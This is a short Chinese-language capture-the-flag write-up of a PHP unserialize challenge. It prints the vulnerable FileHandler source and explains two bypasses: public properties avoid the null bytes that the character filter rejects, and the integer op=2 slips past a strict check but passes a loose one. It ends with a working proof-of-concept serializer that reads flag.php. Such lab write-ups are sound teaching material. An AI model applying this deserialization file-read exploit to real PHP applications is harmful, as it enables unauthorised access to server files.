先审计一下代码，不懂自己都在干啥

```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if($this->op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str); //会调用__destruct函数
    }

}
```

经典的反序列化问题，但是is_valid()函数规定字符的ASCII码必须是32-125，而protected属性在序列化后会出现不可见字符\00*\00，转化为ASCII码不符合要求。

不知道自己一直在传什么

发现大多数php在线运行环境都没有显示这种不可见符。找到一个可以显示的<a href="https://www.toolnb.com/dev/runCode.html">php在线运行</a>，但是这里的\00并没有办法过去is_valid()函数，于是

绕过方法：PHP7.1以上版本对属性类型不敏感，public属性序列化不会出现不可见字符，可以用public属性来绕过。==即我们最后在构造poc的时候，用public来修饰属性==

首先我们看到了read()里面的file_get_contents敏感函数process()中有调用了read()函数，条件是op == “2”
__destruct()调用了process()函数，条件是op!==“2”
可以看到这里有个弱类型的问题，构造op=2即可绕过了

然后即可传递序列化对象即可

```php
<?php
class FileHandler {
    public $op=2;
    public $filename="flag.php";
    public $content="HappyCoder";
}
$a=new FileHandler();
echo serialize($a);
?>
```



注意后面查看源码，而不是对着result：0发呆



